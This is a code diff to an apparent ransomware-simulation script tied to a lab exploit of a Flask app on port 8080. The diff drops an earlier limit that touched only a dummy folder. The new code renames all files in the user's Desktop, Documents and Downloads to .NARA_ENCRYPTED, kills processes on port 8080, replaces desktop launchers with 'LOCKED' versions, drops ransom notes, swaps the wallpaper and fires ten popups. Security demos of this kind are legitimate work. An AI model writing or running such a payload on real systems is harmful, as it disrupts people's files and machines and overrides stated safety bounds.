@@ -61,6 +61,8 @@ DEFAULT_NOTE = """
 DESKTOP = os.path.expanduser("~/Desktop")
 WALLPAPER_PATH = "/tmp/nara_ransom_wallpaper.jpg"
 DUMMY_FILES_DIR = "/tmp/nara_demo_files"
+# Ransom note copy for launcher Exec (survives desktop file renames)
+NOTE_FOR_LAUNCHERS = "/tmp/README_RANSOM.txt"
 
 
 def drop_ransom_note(custom_message: str = ""):
@@ -73,19 +75,66 @@ def drop_ransom_note(custom_message: str = ""):
     print(f"[RANSOMWARE] Ransom note → {note_path}")
 
     # Also drop one in /tmp for visibility in non-desktop environments
-    with open("/tmp/README_RANSOM.txt", "w") as f:
+    with open(NOTE_FOR_LAUNCHERS, "w") as f:
         f.write(content)
-    print("[RANSOMWARE] Ransom note → /tmp/README_RANSOM.txt")
+    print(f"[RANSOMWARE] Ransom note → {NOTE_FOR_LAUNCHERS}")
 
 
-def fake_encrypt_files():
+def shutdown_vulnerable_webapp():
+    """Stop the Flask demo on port 8080 after exploitation (container-local)."""
+    cmds = [
+        "fuser -k 8080/tcp 2>/dev/null || true",
+        "pkill -f '[p]ython3 app.py' 2>/dev/null || true",
+        "pkill -f '[p]ython app.py' 2>/dev/null || true",
+    ]
+    for c in cmds:
+        try:
+            subprocess.run(["bash", "-c", c], timeout=15, capture_output=True)
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+    print("[RANSOMWARE] Web server on :8080 stopped (simulation)")
+
+
+def encrypt_loose_files_everywhere():
     """
-    'Encrypt' dummy files by renaming them with .NARA_ENCRYPTED extension.
-    Only touches files in /tmp/nara_demo_files — never touches real files.
+    Rename user-visible files to *.NARA_ENCRYPTED (simulated encryption).
+    Touches Desktop + Documents + dummy dir; skips .desktop launchers here (handled by hijack).
     """
+    roots = [
+        DESKTOP,
+        os.path.expanduser("~/Documents"),
+        os.path.expanduser("~/Downloads"),
+        DUMMY_FILES_DIR,
+    ]
+    count = 0
+    for root in roots:
+        if not os.path.isdir(root):
+            continue
+        for dirpath, _dirnames, filenames in os.walk(root):
+            for fn in filenames:
+                if fn.endswith(".NARA_ENCRYPTED"):
+                    continue
+                if fn.endswith(".desktop"):
+                    continue
+                path = os.path.join(dirpath, fn)
+                if not os.path.isfile(path):
+                    continue
+                if os.path.abspath(path) == os.path.abspath(NOTE_FOR_LAUNCHERS):
+                    continue
+                dst = path + ".NARA_ENCRYPTED"
+                try:
+                    os.rename(path, dst)
+                    count += 1
+                    print(f"[RANSOMWARE] Encrypted: {path} → {dst}")
+                except OSError as e:
+                    print(f"[RANSOMWARE] Skip {path}: {e}")
+    print(f"[RANSOMWARE] Loose files encrypted (simulation): {count}")
+
+
+def seed_dummy_sensitive_files():
+    """Create dummy files under /tmp/nara_demo_files; encrypt_loose_files_everywhere renames them."""
     os.makedirs(DUMMY_FILES_DIR, exist_ok=True)
 
-    # Create dummy sensitive-looking files
     dummy_files = [
         ("financial_report_Q4.xlsx", "ACME Corp Q4 Revenue: $4.2M"),
         ("employee_records.csv", "id,name,salary\n1,John Smith,95000"),
@@ -99,18 +148,32 @@ def fake_encrypt_files():
         with open(fpath, "w") as f:
             f.write(content)
 
-    # "Encrypt" by renaming
-    encrypted_count = 0
-    for fname in os.listdir(DUMMY_FILES_DIR):
-        if fname.endswith(".NARA_ENCRYPTED"):
-            continue
-        src = os.path.join(DUMMY_FILES_DIR, fname)
-        dst = src + ".NARA_ENCRYPTED"
-        os.rename(src, dst)
-        print(f"[RANSOMWARE] Encrypted: {fname} → {fname}.NARA_ENCRYPTED")
-        encrypted_count += 1
+    print(f"[RANSOMWARE] Seeded dummy files in {DUMMY_FILES_DIR}")
 
-    print(f"[RANSOMWARE] {encrypted_count} file(s) encrypted in {DUMMY_FILES_DIR}")
+
+def show_ransom_popups(count: int = 10):
+    """Sequential modal dialogs (demo annoyance). Requires zenity on DISPLAY."""
+    env = os.environ.copy()
+    env.setdefault("DISPLAY", ":1")
+    for i in range(count):
+        try:
+            subprocess.run(
+                [
+                    "zenity",
+                    "--warning",
+                    "--title=RANSOMWARE",
+                    "--text=RANSOMWARE",
+                    "--no-wrap",
+                    "--width=320",
+                ],
+                env=env,
+                timeout=600,
+                capture_output=True,
+            )
+        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
+            print(f"[RANSOMWARE] Popup {i + 1}/{count} skipped: {e}")
+            break
+    print(f"[RANSOMWARE] Showed {count} RANSOMWARE dialog(s) (zenity)")
 
 
 def hijack_desktop_shortcuts():
@@ -119,7 +182,7 @@ def hijack_desktop_shortcuts():
     then drop ransom-themed shortcuts so the XFCE desktop visibly reflects the takeover.
     """
     os.makedirs(DESKTOP, exist_ok=True)
-    readme = os.path.join(DESKTOP, "README_RANSOM.txt")
+    readme = NOTE_FOR_LAUNCHERS
     rocket_icon = _ICON_FOLDER  # Red R on dark — used for all hijacked icons
 
     # Replace ALL existing .desktop files with "LOCKED" versions using the R icon
@@ -389,11 +452,14 @@ def main(custom_message: str = ""):
 
     print_ascii_skull()
 
+    shutdown_vulnerable_webapp()
     drop_ransom_note(custom_message)
     generate_rocket_icons()
     hijack_desktop_shortcuts()
-    fake_encrypt_files()
+    seed_dummy_sensitive_files()
+    encrypt_loose_files_everywhere()
     change_wallpaper()
+    show_ransom_popups(10)
 
     print("\n" + "═" * 60)
     print("[RANSOMWARE] Payload complete.")
